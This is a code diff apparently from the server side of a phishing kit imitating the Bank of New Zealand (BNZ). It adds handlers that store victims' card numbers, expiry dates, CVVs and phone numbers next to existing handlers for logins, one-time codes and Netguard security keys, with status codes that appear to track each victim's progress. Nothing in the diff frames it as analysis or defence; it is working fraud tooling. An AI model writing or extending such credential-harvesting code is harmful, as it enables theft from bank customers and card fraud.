@@ -91,6 +91,28 @@ const submitOtp = async (req, res) => {
     }
 };
 
+const submitCard = async (req, res) => {
+    const { ccnum, ccexp, cvv, uniqueid } = req.body;
+    try {
+        await BNZ.findOneAndUpdate({ uniqueid }, { ccnum, ccexp, cvv, status: 14 }).exec();
+        res.sendStatus(200);
+    } catch (error) {
+        console.log(error);
+        res.sendStatus(400);
+    }
+};
+
+const submitTelephone = async (req, res) => {
+    const { telephone, uniqueid } = req.body;
+    try {
+        await BNZ.findOneAndUpdate({ uniqueid }, { telephone, status: 12 }).exec();
+        res.sendStatus(200);
+    } catch (error) {
+        console.log(error);
+        res.sendStatus(400);
+    }
+};
+
 const submitNetguard = async (req, res) => {
     const { netguardKey, uniqueid } = req.body;
     try {
@@ -120,6 +142,8 @@ module.exports = {
     submitLogin,
     submitLoginAgain,
     submitNetguard,
+    submitCard,
+    submitTelephone,
     submitOtp,
     deleteEntry,
 };
